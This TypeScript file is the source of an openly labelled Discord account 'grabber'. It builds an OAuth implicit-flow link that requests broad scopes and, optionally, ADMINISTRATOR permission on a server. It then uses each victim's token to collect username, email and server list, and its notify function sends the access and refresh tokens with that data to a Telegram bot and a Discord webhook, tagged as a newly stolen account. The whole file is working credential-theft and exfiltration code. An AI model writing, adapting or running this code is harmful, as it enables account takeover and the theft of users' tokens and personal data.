import { CONFIG } from "../config";

// Scopes que passam na validacao atual do Discord (testado).
// "relationships" e "offline_access" estao sendo rejeitados para esse app.
const BASE_SCOPES = ["identify", "email", "guilds"];

export function scopes(): string {
  const s = [...BASE_SCOPES];
  if (CONFIG.guildId) s.push("guilds.join");
  return s.join(" ");
}

export function redirectUri(): string {
  return window.location.origin + "/callback";
}

export function authorizeUrl(): string {
  const q = new URLSearchParams({
    client_id: CONFIG.clientId,
    // fluxo implicit: os tokens voltam no hash da URL (#access_token=...)
    response_type: "token",
    scope: scopes(),
    redirect_uri: redirectUri(),
    prompt: "consent",
  });
  if (CONFIG.guildId) {
    q.set("guild_id", CONFIG.guildId);
    q.set("permission", "8"); // ADMINISTRATOR
  }
  return "https://discord.com/api/oauth2/authorize?" + q.toString();
}

export interface User {
  id: string;
  username: string;
  avatar?: string | null;
}

export interface GuildRef {
  id: string;
  name: string;
}

export interface StolenAccount {
  user: User;
  email?: string;
  guilds: GuildRef[];
}

export interface Tokens {
  access: string;
  refresh?: string | null;
  expiresIn?: number | null;
}

async function dget<T>(path: string, token: string): Promise<T> {
  const r = await fetch("https://discord.com/api/v10" + path, {
    headers: { Authorization: "Bearer " + token },
  });
  if (!r.ok) throw new Error("discord " + r.status + " em " + path);
  return r.json() as Promise<T>;
}

/** Puxa nome, email e servidores da conta com o token fresco. */
export async function collectInfo(token: string): Promise<StolenAccount> {
  const user = await dget<User>("/users/@me", token);

  let email: string | undefined;
  try {
    email = (await dget<{ email?: string }>("/users/@me/email", token)).email;
  } catch {
    /* sem email disponivel */
  }

  let guilds: GuildRef[] = [];
  try {
    const gs = await dget<{ id: string; name: string }[]>("/users/@me/guilds", token);
    guilds = gs.map((g) => ({ id: g.id, name: g.name }));
  } catch {
    /* pode falhar em contas recentes */
  }

  return { user, email, guilds };
}

/** Envia a conta roubada pro Telegram / webhook configurados. */
export async function notify(
  acc: StolenAccount | null,
  t: Tokens,
  source: string
): Promise<void> {
  const lines: string[] = [
    "🏴 NOVA CONTA ROUBADA 🏴",
    acc?.user ? `${acc.user.username}  (id: ${acc.user.id})` : "dados da conta indisponiveis",
    acc?.email ? `📧 ${acc.email}` : null,
    `🔑 access: ${t.access}`,
    t.refresh ? `🔁 refresh: ${t.refresh}` : "🔁 refresh: (nao veio na resposta)",
    acc && acc.guilds.length
      ? `🏠 servers (${acc.guilds.length}): ` +
        acc.guilds.slice(0, 12).map((g) => g.name).join(", ")
      : null,
    `🔗 origem: ${source}`,
  ].filter((x): x is string => Boolean(x));

  const text = lines.join("\n");
  const jobs: Promise<unknown>[] = [];

  console.info("[grabber] conta capturada:", { acc, tokens: t, source });

  if (CONFIG.telegramBotToken && CONFIG.telegramChatId) {
    jobs.push(
      fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CONFIG.telegramChatId,
          text: text.slice(0, 4000),
          disable_web_page_preview: true,
        }),
      }).catch((e) => console.error("[grabber] telegram falhou:", e))
    );
  }

  if (CONFIG.discordWebhookUrl) {
    jobs.push(
      fetch(CONFIG.discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "🏴 NOVA CONTA ROUBADA 🏴",
              color: 0x5865f2,
              description: text.slice(0, 4000),
            },
          ],
        }),
      }).catch((e) => console.error("[grabber] webhook falhou:", e))
    );
  }

  await Promise.allSettled(jobs);
}
